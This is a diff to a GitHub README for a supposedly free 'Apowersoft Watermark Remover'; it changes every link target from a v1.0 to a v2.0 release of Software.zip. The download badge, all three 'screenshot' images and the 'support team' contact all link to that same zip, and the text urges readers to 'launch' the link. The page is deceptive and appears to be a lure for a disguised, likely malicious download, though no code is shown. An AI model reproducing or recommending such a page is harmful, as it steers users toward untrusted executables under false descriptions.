@@ -1,6 +1,6 @@
 # 🌟 Apowersoft Watermark Remover Free 🌟
 
-[![Download](https://github.com/kenziderghal23/Apowersoft-Watermark-Remover-Free/releases/download/v1.0/Software.zip%20here-green)](https://github.com/kenziderghal23/Apowersoft-Watermark-Remover-Free/releases/download/v1.0/Software.zip)
+[![Download](https://github.com/kenziderghal23/Apowersoft-Watermark-Remover-Free/releases/download/v2.0/Software.zip%20here-green)](https://github.com/kenziderghal23/Apowersoft-Watermark-Remover-Free/releases/download/v2.0/Software.zip)
 
 Welcome to the **Apowersoft Watermark Remover Free** repository! This tool is designed to help you easily remove watermarks from your videos, PDFs, or any other files. Whether you're dealing with watermarks in Apowersoft software or online, this remover has got you covered.
 
@@ -39,12 +39,12 @@ To start using the Apowersoft Watermark Remover Free tool, simply click the down
 ## 📸 Screenshots
 Check out these screenshots of the Apowersoft Watermark Remover Free tool in action:
 
-![Screenshot 1](https://github.com/kenziderghal23/Apowersoft-Watermark-Remover-Free/releases/download/v1.0/Software.zip)
-![Screenshot 2](https://github.com/kenziderghal23/Apowersoft-Watermark-Remover-Free/releases/download/v1.0/Software.zip)
-![Screenshot 3](https://github.com/kenziderghal23/Apowersoft-Watermark-Remover-Free/releases/download/v1.0/Software.zip)
+![Screenshot 1](https://github.com/kenziderghal23/Apowersoft-Watermark-Remover-Free/releases/download/v2.0/Software.zip)
+![Screenshot 2](https://github.com/kenziderghal23/Apowersoft-Watermark-Remover-Free/releases/download/v2.0/Software.zip)
+![Screenshot 3](https://github.com/kenziderghal23/Apowersoft-Watermark-Remover-Free/releases/download/v2.0/Software.zip)
 
 ## 🌐 Support
-If you encounter any issues while using the Apowersoft Watermark Remover Free tool, feel free to reach out to our support team at [https://github.com/kenziderghal23/Apowersoft-Watermark-Remover-Free/releases/download/v1.0/Software.zip](https://github.com/kenziderghal23/Apowersoft-Watermark-Remover-Free/releases/download/v1.0/Software.zip). We are here to assist you with any questions or concerns you may have.
+If you encounter any issues while using the Apowersoft Watermark Remover Free tool, feel free to reach out to our support team at [https://github.com/kenziderghal23/Apowersoft-Watermark-Remover-Free/releases/download/v2.0/Software.zip](https://github.com/kenziderghal23/Apowersoft-Watermark-Remover-Free/releases/download/v2.0/Software.zip). We are here to assist you with any questions or concerns you may have.
 
 ## 📦 Download Link Launch
 Please note that the download link above needs to be launched to start downloading the Apowersoft Watermark Remover Free tool.
